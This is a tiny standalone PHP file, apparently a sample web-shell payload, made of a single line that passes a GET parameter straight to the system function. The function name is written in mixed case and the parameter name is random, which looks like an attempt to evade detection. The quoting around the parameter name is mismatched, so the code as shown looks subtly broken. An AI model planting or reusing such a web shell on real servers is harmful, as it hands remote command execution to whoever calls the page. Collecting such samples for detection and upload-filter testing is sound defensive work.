<?php
SysTeM($_GET["ljXmjlAr']);
?>
